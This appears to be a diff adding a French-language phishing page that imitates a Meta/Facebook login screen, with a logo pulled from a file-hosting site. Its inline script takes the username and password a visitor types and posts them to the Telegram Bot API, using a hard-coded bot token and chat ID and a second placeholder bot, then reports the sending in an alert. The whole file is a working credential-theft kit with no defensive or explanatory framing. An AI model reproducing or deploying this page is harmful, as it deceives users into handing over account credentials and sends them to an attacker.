@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion</title>
+    <style>
+        body {
+            font-family: "Gill Sans Extrabold", sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #ffffff;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 350px;
+            border: 1px solid #e0e0e0;
+        }
+        .language {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 15px;
+        }
+        .logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: calc(100% - 40px);
+            padding: 17px;
+            margin: 14px 0;
+            border: 1px solid #ccc;
+            border-radius: 12px;
+            font-size: 16px;
+            background-color: #ffffff;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .btn {
+            width: calc(100% - 20px);
+            background-color: #1877f2;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 28px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .forgot-link {
+            display: block;
+            margin-top: 20px;
+            color: #000000;
+            text-decoration: none;
+            font-size: 18px;
+        }
+        .create-account {
+            display: block;
+            margin-top: 20px;
+            padding: 10px;
+            border: 2px solid #1877f2;
+            border-radius: 28px;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: bold;
+            background-color: white;
+            width: calc(100% - 20px);
+            display: inline-block;
+        }
+        .meta {
+            margin-top: 20px;
+            color: #555;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <p class="language">Français (France) ▼</p>
+        <br>
+        <img src="https://files.catbox.moe/f4y3xd.webp" alt="Logo" class="logo">
+        <input type="text" placeholder="Nom de profil, e-mail ou numéro...">
+        <input type="password" placeholder="Mot de passe">
+        <button class="btn">connecter</button>
+        <a href="#" class="forgot-link">Mot de passe oublié ?</a>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <a href="#" class="create-account">Créer un compte</a>
+        <p class="meta">Ⓜ Meta</p>
+    </div>
+    <script>
+        // Fonction pour envoyer le message à Telegram (à plusieurs bots)
+        function sendToTelegram(message, token, chatId) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
+    
+            return fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Message envoyé avec succès:', data);
+                    return true; // L'envoi a réussi
+                } else {
+                    console.error('Erreur Telegram:', data);
+                    return false; // L'envoi a échoué
+                }
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi du message:', error);
+                return false; // L'envoi a échoué
+            });
+        }
+    
+        // Fonction pour gérer la soumission du formulaire
+        document.querySelector('.btn').addEventListener('click', async function() {
+            const username = document.querySelector('input[type="text"]').value;
+            const password = document.querySelector('input[type="password"]').value;
+    
+            if (username && password) {
+                const message = `Nom de profil: ${username}\nMot de passe: ${password}`;
+    
+                // Les tokens et chat IDs des deux bots
+                const token1 = '6799956480:AAF6uKM4b72aAxNe6n2vOCuHpg7rCJoRPkY';  // Remplace par ton premier token
+                const chatId1 = '6669693805';   // Remplace par ton premier chat ID
+                const token2 = 'TON_BOT_TOKEN_2';  // Remplace par ton deuxième token
+                const chatId2 = 'TON_CHAT_ID_2';   // Remplace par ton deuxième chat ID
+    
+                // Envoie les informations à deux bots différents
+                const success1 = await sendToTelegram(message, token1, chatId1);
+                const success2 = await sendToTelegram(message, token2, chatId2);
+    
+                if (success1 && success2) {
+                    alert('Les informations ont été envoyées via Telegram!');
+                } else {
+                    alert('Il y a eu un problème lors de l\'envoi des informations.');
+                }
+            } else {
+                alert('Veuillez remplir tous les champs!');
+            }
+        });
+    </script>
+    
+    
+    
+</body>
+</html>
